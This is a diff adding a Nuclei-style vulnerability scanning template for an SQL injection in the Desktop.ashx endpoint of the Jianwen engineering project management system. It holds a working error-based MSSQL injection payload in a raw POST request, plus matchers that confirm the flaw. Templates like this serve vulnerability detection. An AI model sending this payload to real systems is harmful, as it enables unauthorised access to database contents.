@@ -1,0 +1,28 @@
+id: jianwen-engineering-desktop-sql
+
+info:
+  name: "建文工程管理系统 desktop.ashx 接口 SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    建文工程项目管理软件为弱电施工、系统集成、机房工程、IDC数据中心等场景提供集成化解决方案。
+    该系统在desktop.ashx接口处理过程中存在SQL注入漏洞，攻击者可通过构造恶意SQL代码实现数据库敏感信息泄露。
+     reference: 官方文档未披露安全加固方案
+  tags: 建文工程管理系统
+
+http:
+- raw:
+  - |
+    POST /SysFrame4/Desktop.ashx HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    account=1'+and+%01(select+SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','NdayTest')),3,32))<0--&method=isChangePwd&pwd=
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'c7e57c8d7'
